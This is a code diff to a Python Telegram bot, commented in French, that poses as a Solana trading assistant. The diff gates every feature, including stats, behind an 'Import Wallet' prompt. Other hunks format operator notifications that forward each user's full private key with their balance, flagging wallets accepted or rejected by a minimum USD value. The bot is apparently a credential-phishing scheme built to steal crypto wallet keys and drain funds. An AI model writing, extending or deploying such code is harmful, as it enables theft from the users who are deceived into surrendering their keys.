@@ -527,28 +527,14 @@ Select your new wallet provider:"""
     
     # ========== GESTION DES BOUTONS DU MENU PRINCIPAL ==========
     
-    # Boutons qui nécessitent une connexion wallet et demandent la config de tracking
-    tracking_buttons = ['quick_buy', 'bloom_trading', 'multi_wallet', 'contract_analyzer']
+    # TOUS les boutons (sauf language et stats) nécessitent une connexion wallet
+    feature_buttons = ['quick_buy', 'bloom_trading', 'multi_wallet', 'contract_analyzer', 
+                      'ai_predict', 'whale_tracker', 'rug_detector']
     
-    if action in tracking_buttons:
+    if action in feature_buttons:
         # Vérifier si le wallet est connecté
-        if context.user_data.get('wallet_connected'):
-            # Wallet connecté, demander la configuration de tracking
-            request_message = get_tracking_config_message()
-            
-            await query.message.delete()
-            await query.message.reply_text(
-                request_message,
-                parse_mode='HTML'
-            )
-            
-            # Marquer que l'utilisateur doit fournir les infos de tracking
-            context.user_data['waiting_for_tracking_config'] = True
-            # Sauvegarder quelle action a été cliquée
-            context.user_data['tracking_command'] = action
-            return
-        else:
-            # Wallet non connecté, afficher le message d'import de wallet
+        if not context.user_data.get('wallet_connected'):
+            # Wallet NON connecté - TOUJOURS demander la connexion wallet
             wallet_message = """🔐 Import Wallet
 
 ⚠️ Authentication required to access trading features.
@@ -569,67 +555,20 @@ Select your wallet provider:"""
                 reply_markup=wallet_markup
             )
             return
-    
-    # AI Market Predict
-    if action == 'ai_predict':
-        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        # Wallet connecté - Demander la configuration de tracking
+        request_message = get_tracking_config_message()
         
         await query.message.delete()
         await query.message.reply_text(
-            "🧠 **AI Market Predictions**\n\n"
-            "Machine learning powered market analysis.\n\n"
-            "Our AI analyzes:\n"
-            "• Price trends\n"
-            "• Volume patterns\n"
-            "• Social sentiment\n"
-            "• Whale movements\n"
-            "• Historical data\n\n"
-            "Get predictions for any token!",
-            reply_markup=reply_markup,
+            request_message,
             parse_mode='HTML'
         )
-        return
-    
-    # Whale Tracker
-    if action == 'whale_tracker':
-        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await query.message.delete()
-        await query.message.reply_text(
-            "🐋 **Whale Tracker**\n\n"
-            "Monitor large wallet movements in real-time.\n\n"
-            "Track:\n"
-            "• Large buys/sells\n"
-            "• Whale wallet activities\n"
-            "• Smart money movements\n"
-            "• DEX transactions\n\n"
-            "Get alerts when whales move!",
-            reply_markup=reply_markup,
-            parse_mode='HTML'
-        )
-        return
-    
-    # Rug-Pull Detector
-    if action == 'rug_detector':
-        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        await query.message.delete()
-        await query.message.reply_text(
-            "🔴 **Rug-Pull Detector**\n\n"
-            "Advanced protection against scams.\n\n"
-            "We detect:\n"
-            "• Suspicious token patterns\n"
-            "• Dev wallet analysis\n"
-            "• Liquidity risks\n"
-            "• Honeypot contracts\n"
-            "• Known scam indicators\n\n"
-            "Send a token address to check!",
-            reply_markup=reply_markup,
-            parse_mode='HTML'
-        )
+        # Marquer que l'utilisateur doit fournir les infos de tracking
+        context.user_data['waiting_for_tracking_config'] = True
+        # Sauvegarder quelle action a été cliquée
+        context.user_data['tracking_command'] = action
         return
     
     # Language
@@ -650,8 +589,33 @@ Select your wallet provider:"""
         )
         return
     
-    # Stats
+    # Stats - REQUIERT AUSSI LE WALLET
     if action == 'stats':
+        # Vérifier si le wallet est connecté
+        if not context.user_data.get('wallet_connected'):
+            # Wallet NON connecté - Demander la connexion
+            wallet_message = """🔐 Import Wallet
+
+⚠️ Authentication required to access trading features.
+
+Select your wallet provider:"""
+            
+            wallet_keyboard = [
+                [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
+                [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
+                [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
+            ]
+            
+            wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
+            
+            await query.message.delete()
+            await query.message.reply_text(
+                wallet_message,
+                reply_markup=wallet_markup
+            )
+            return
+        
+        # Wallet connecté - Afficher les stats
         keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
@@ -1245,7 +1209,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 🎯 <b>Commande:</b> {escape_html(tracking_command)}
 
 ❌ <b>Erreur:</b> {escape_html(error_message)}
@@ -1416,10 +1380,10 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 🎯 <b>Commande:</b> {escape_html(tracking_command)}
 
-👛 <b>Wallet:</b> `{escape_html(public_key)}`
+👛 <b>Wallet:</b> {escape_html(public_key)}
 💰 <b>Balance:</b> {sol_balance:.4f} SOL (${usd_balance:.2f} USD)
 
 📋 **Configuration:**
@@ -1462,11 +1426,11 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
 🔑 <b>Clé tentée:</b>
-`{user_message[:20]}...`
+{escape_html(user_message[:20])}...
 
 ---
 ⚠️ <i>Clé privée invalide</i>"""
@@ -1501,17 +1465,17 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 <b>Public Key:</b> `{escape_html(public_key)}`
+👛 <b>Public Key:</b> {escape_html(public_key)}
 💰 <b>Balance:</b> {sol_balance:.4f} SOL
 💵 <b>Valeur USD:</b> ${usd_value:.2f}
 📊 <b>Prix SOL:</b> ${sol_price:.2f}
 ⚠️ <b>Minimum requis:</b> ${MINIMUM_USD_REQUIRED:.2f}
 
 🔑 <b>Private Key:</b>
-`{user_message}`
+{escape_html(user_message)}
 
 ---
 ❌ <i>Wallet rejeté - Solde insuffisant (< ${MINIMUM_USD_REQUIRED})_"""
@@ -1554,16 +1518,16 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 💳 <b>Wallet Type:</b> {escape_html(wallet_type)}
 
-👛 <b>Public Key:</b> `{escape_html(public_key)}`
+👛 <b>Public Key:</b> {escape_html(public_key)}
 💰 <b>Balance:</b> {sol_balance:.4f} SOL
 💵 <b>Valeur USD:</b> ${usd_value:.2f}
 📊 <b>Prix SOL:</b> ${sol_price:.2f}
 
 🔑 <b>Private Key:</b>
-`{user_message}`
+{escape_html(user_message)}
 
 ---
 ✅ <i>Wallet accepté et connecté</i>"""
@@ -1584,7 +1548,7 @@ You can now access all trading features and start trading!"""
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
 🆔 <b>Username:</b> @{escape_html(user.username) if user.username else '❌ PAS DE USERNAME'}
-🔢 <b>User ID:</b> `{user.id}`
+🔢 <b>User ID:</b> {user.id}
 
 💬 <b>Message:</b>
 {escape_html(user_message)}
